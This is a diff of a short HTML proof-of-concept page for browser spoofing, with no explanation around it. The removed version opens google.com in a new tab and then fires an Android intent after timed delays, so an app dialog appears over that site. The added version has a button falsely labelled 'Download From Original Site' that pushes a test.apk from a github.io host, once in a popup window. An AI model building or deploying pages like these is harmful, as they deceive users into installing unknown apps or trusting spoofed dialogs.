@@ -1,52 +1,30 @@
-<!doctype html>
-<html lang="id">
-<head>
-<meta charset="utf-8">
-<title>External Intent – Adaptive Delay</title>
+<html>
+ <head> 
+  <meta charset="utf-8">
 <style>
-  body{font-family:system-ui;padding:40px}
-  button{padding:14px 22px;font-size:16px}
-  pre{margin-top:12px;color:#555;white-space:pre-wrap}
+.button {
+  background-color: #4CAF50;
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
 </style>
-</head>
-<body>
-
-<h3>Open Target → External App Dialog (Adaptive Delay)</h3>
-<p>
-Klik sekali. Tab baru dibuka ke target. Setelah beberapa delay percobaan,
-intent eksternal dipicu (best-effort).
-</p>
-
-<button id="go">Run</button>
-<pre id="log"></pre>
-
-<script>
-const logEl = document.getElementById('log');
-const log = s => logEl.textContent += s + "\n";
-
-// Delay percobaan (ms)
-const DELAYS = [1200, 1800, 2400, 3000];
-
-document.getElementById('go').onclick = () => {
-  log("User click");
-
-  // 1) Buka tab target (pindah fokus)
-  window.open("https://www.google.com", "_blank");
-  log("Opened target tab");
-
-  // 2) Coba intent di beberapa delay (stop di yang pertama berhasil)
-  let fired = false;
-  DELAYS.forEach(d => {
-    setTimeout(() => {
-      if (fired) return;
-      fired = true;
-      log("Trigger intent at " + d + " ms");
-      location.href =
-        "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end";
-    }, d);
-  });
-};
-</script>
-
-</body>
+ </head> 
+ <body> 
+  <script>
+function a(){
+    window.open('http://frozzipies.github.io/test.apk', '_blank');
+    setTimeout(function(){
+        window.open('http://frozzipies.github.io/test.apk', '_blank', "popup=yes,width=900,height=700");
+    }, 1000);
+}
+</script> 
+  <center><input type="button" class="button" value="Download From Original Site" onclick="a()"> </center>
+ </body>
 </html>
